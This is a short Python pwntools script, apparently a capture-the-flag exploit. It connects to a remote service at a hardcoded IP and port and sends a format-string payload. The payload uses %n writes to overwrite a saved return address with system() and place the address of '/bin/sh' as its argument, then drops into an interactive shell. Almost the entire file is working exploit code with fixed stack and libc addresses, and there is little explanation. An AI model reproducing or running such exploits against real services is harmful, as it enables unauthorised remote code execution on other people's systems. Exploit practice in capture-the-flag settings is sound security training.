#!/usr/bin/env python

from pwn import *

# This is the stack address that contains return address 0x8048702
# We will store the address of system() here.
stack_addr_one = 0xffffda9c

# This is the stack address that will contain the first argument passed into system.
# The argument will be the libc address of "/bin/sh"
stack_addr_two = stack_addr_one + 0x8

TIMEOUT = 3.0

def recv_response(p):
    r = p.recvrepeat(TIMEOUT)
    print "[+] Response: " + r
    return r

p = remote("35.237.220.217", 1339)

buf =  p32(stack_addr_one)
buf += p32(stack_addr_one + 1)
buf += p32(stack_addr_one + 2)
buf += p32(stack_addr_one + 3)
buf += p32(stack_addr_two)
buf += p32(stack_addr_two + 1)
buf += p32(stack_addr_two + 2)
buf += p32(stack_addr_two + 3)

# write the address of system() (0xf7e53940) into stack_addr_one
# overwriting 0x8048702.
buf += "a" * 104
buf += "%64x"
buf += "%18$n"
buf += "%249x"
buf += "%19$n"
buf += "%172x"
buf += "%20$n"
buf += "%18x"
buf += "%21$n"

# write the address of "/bin/sh" (0xf7f7202b) into stack_addr_two
buf += "%52x"
buf += "%22$n"
buf += "%245x"
buf += "%23$n"
buf += "%215x"
buf += "%24$n"
buf += "%25$n"

p.sendline(buf)

recv_response(p)

p.interactive()
